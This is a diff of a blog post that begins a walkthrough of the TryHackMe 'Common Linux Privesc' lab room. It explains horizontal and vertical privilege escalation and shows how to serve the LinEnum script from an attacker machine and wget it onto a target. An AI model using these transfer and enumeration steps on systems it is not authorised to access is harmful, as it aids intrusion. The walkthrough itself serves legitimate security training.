@@ -35,17 +35,28 @@ layout: post
 thumb_img_path: /images/o9pyhyU.jpg
 content_img_path: /images/banner.png
 ---
-TryHackMe - PickleRick CTF: <https://tryhackme.com/room/picklerick>
+TryHackMe - Common Linux Privesc (Privilege Escalation): <https://tryhackme.com/room/commonlinuxprivesc>
 
-This box is listed as Easy .  Most (if not all) of these tasks can be completed in just the browser.  However, I will be using the command line, and:
+This box is listed as Easy .  It provides walk-throughs and practice of common linux privilege escalation vectors.   
 
-\`NMAP NETCAT GOBUSTER\`
+# TASKS 1 - 3 | What is Privesc?
 
-Where available, I will be providing guidance for browser only interaction.
+Let's start by discussing what "privesc" is.  Essentially, privesc (privilege escalation) is leveraging access to a low pricilege account to move to a higer privilege account (eg user to root).  Privesc can occur in two directions: horizontal and vertical.  In horizontal privesc, access is gained to an account of the same privilege level. This can be beneficial to access private files or if the new user has SUIDs we can exploit.  In vertical privesc, access is gained to an account with more access to the system (admin / root).  Read through the provided information in each of the three tasks and complete each section.
 
-# ENUMERATION
+# TASK 4 | ENUMERATION
 
-First, let's start by pinging the machine and making sure we're able to connect.
+## LinEnum
+
+LinEnum is a bash script which performs common commands related to privesc.  It can be downloaded from:
+
+<https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh>
+
+Two ways to get LinEnum onto the target machine:
+
+First - start a python webserver from the directory with your copy of LinEnum.sh. (python3 -m http.server 8000).  Then, wget the file from the target machine (wget \[LOCAL_IP]:8000/LinEnum.sh).  After it has been transfered to the target machine, make the file executable (chmod +x LinEnum.sh).
+
+Second - Provided you have the required permissions, copy the raw code and create a .sh file in vi/nano/etc and paste the code.  Make the file executable.
+
 
 ![](/images/ping.png)
 
